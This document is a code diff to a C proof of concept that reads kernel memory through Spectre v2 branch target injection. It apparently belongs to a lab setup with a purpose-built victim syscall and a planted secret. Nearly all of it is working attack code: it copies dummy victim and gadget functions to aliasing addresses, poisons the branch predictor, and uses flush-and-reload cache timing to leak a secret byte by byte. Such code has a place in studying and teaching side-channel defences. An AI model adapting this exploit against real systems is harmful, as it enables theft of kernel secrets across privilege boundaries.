@@ -1,3 +1,17 @@
+/*
+  Reads kernel memory using spectre v2. This code works with kernel/sysattack.cc
+
+  General approach:
+  - The functions dummy_victim and dummy_gadget are memcpy'd to the same addresses
+    (minus the top kernel bit of the virtual address) as sys_spectre_victim and
+    gadget, which are defined in sysattack.cc, respectively.
+  - Dummy_victim contains an indirect call that is approximately at the same address
+    as the indirect call in sys_spectre_victim. Dummy_victim is repeatedly called
+    such that the indirect call jumps to dummy_gadget.
+  - When sys_spectre_victim is called, the target of the indirect call will
+    be mispredicted to gadget, which reads kernel memory into the side channel.
+ */
+
 #pragma GCC push_options
 #pragma GCC optimize ("O0")
 
@@ -65,13 +79,13 @@ mmap_two_pages(u64 addr)
               0, 0);
 }
 
-int (*uv)(u8*, u64, int);
-u64 uga;
+int (*uv)(u8*, u64, int); // memcpy'd dummy_victim
+u64 uga; // address of memcpy'd dummy_gadget
 
+// see appendix C of https://spectreattack.com/spectre.pdf
 int
 readByte(char *addrToRead, char result[2])
 {
-  // see appendix C of https://spectreattack.com/spectre.pdf
   u8 *channel = (u8*) malloc(256 * GAP * sizeof(u8));
   int hits[256]; // record cache hits
   int tries, i, j, k, mix_i, junk = 0;
@@ -85,48 +99,22 @@ readByte(char *addrToRead, char result[2])
 
   for (tries = 999; tries > 0; tries--) {
     // poison branch predictor
-    //set_safe_addr(kga);
-    //mfence();
-
     for (j = 50; j > 0; j--) {
-      //junk ^= victim(channel, 84, 0);
-      //junk ^= uv(channel, (u64) &dummy_gadget, 0);
       junk ^= uv(channel, uga, 0);
     }
-
     mfence();
 
     // flush side channel
     for (i = 0; i < 256; i++)
       clflush(&channel[i * GAP]);
-
-    mfence();
-
-    //set_safe_addr(ksa);
     mfence();
 
     // flush actual target
-    flush_target();
-
+    spectre_flush_target();
     mfence();
 
-    // set up registers
-    // victim speculatively executes gadget
-    // gadget will read from address at (%rdi, 512 * (%rsi), 1)
-    /*
-    __asm volatile("mov %0, %%rdi\n"
-                   "mov %1, %%rsi\n"
-                   :: "r" (channel), "r" (&secret)
-                   : "%rdi", "%rsi");
-    */
-
     // call victim
-    //junk ^= victim(channel, 42, 0);
-    junk ^= victim(channel, (u8 *)addrToRead, 0);
-    //printf("incorrect elapsed: %lu\n", elapsed);
-
-    //junk ^= channel[250 * GAP];
-
+    junk ^= spectre_victim(channel, (u8*)addrToRead, 0);
     mfence();
 
     // time reads, mix up order to prevent stride prediction
@@ -171,13 +159,12 @@ readByte(char *addrToRead, char result[2])
 int
 main(int argc, char *argv[])
 {
-  u64 kva = get_victim_addr(); // need to mistrain this call
-  u64 kga = get_gadget_addr(); // to predict here
+  u64 kva = spectre_get_victim_addr(); // need to mistrain this call
+  u64 kga = spectre_get_gadget_addr(); // to predict here
   if (PRINT_DEBUG)
     printf("kva: 0x%lx, kga: 0x%lx\n", kva, kga);
-  u64 ksa = get_safe_addr();
 
-  int kvoffset = get_victim_offset(); // offset to call instruction
+  int kvoffset = spectre_get_victim_call_offset(); // offset to call instruction
   if (PRINT_DEBUG)
     printf("kvoffset: %d\n", kvoffset);
 
@@ -187,10 +174,8 @@ main(int argc, char *argv[])
   if (PRINT_DEBUG)
     printf("uvoffset: %d\n", uvoffset);
 
-  if (PRINT_DEBUG && kvoffset != uvoffset) {
+  if (PRINT_DEBUG && kvoffset != uvoffset) // offsets just have to be close enough
     printf("kernel and user offsets don't match\n");
-    //return 1;
-  }
 
   u64 uva = (kva & USER_MASK) + kvoffset - uvoffset;
   if (PRINT_DEBUG)
@@ -224,16 +209,18 @@ main(int argc, char *argv[])
     return 1;
   }
 
-  u64 ksecret = get_secret_addr();
-
   uv = ((int (*)(u8*, u64, int)) uva);
 
-  //set_safe_addr(ksa);
-  char result[2];
+  int secret_len;
+  u64 secret_addr = spectre_get_secret_addr(&secret_len);
+
   int junk = 0;
+  char result[2]; // result[0] is the char, result[1] == 1 if char is valid
   int index = 0;
-  while (index < 46) {
-    junk += readByte(((char*) ksecret) + index, result);
+
+  printf("Reading secret phrase: ");
+  while (index < secret_len) {
+    junk += readByte(((char*) secret_addr) + index, result);
     if (result[1] == 1) {
       if (result[0] == 0)
         break;
